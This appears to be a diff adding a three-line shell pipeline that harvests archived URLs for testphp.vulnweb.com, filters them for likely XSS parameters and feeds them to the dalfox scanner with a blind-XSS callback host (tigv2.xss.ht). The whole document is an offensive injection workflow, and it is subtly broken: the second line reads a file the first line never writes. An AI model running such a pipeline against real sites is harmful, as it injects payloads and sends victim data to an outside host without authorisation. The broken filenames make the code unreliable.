@@ -1,0 +1,3 @@
+echo “testphp.vulnweb.com” | waybackurls | tee testphp.txt
+cat waysbackurls.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt
+dalfox file testxss.txt -b tigv2.xss.ht pipe
